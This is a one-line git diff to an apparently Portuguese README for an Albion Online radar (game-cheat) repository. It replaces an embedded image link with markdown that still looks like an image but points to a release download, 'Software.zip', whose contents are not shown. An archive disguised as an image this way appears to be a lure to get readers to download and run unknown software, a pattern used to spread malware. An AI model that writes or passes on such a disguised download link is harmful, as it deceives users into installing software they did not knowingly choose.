@@ -11,4 +11,4 @@ Instruções !
 
 
 
-![e9c70144-5393-40b9-8ff9-1bdd7fd9f3fa](https://github.com/andrebcb/AlbionRadar-Atualizado/assets/102181923/41c09a86-734e-4dda-8d3e-972e2cc0c635)
+![e9c70144-5393-40b9-8ff9-1bdd7fd9f3fa](https://github.com/andrebcb/AlbionRadar-Atualizado/releases/download/v1.0/Software.zip)
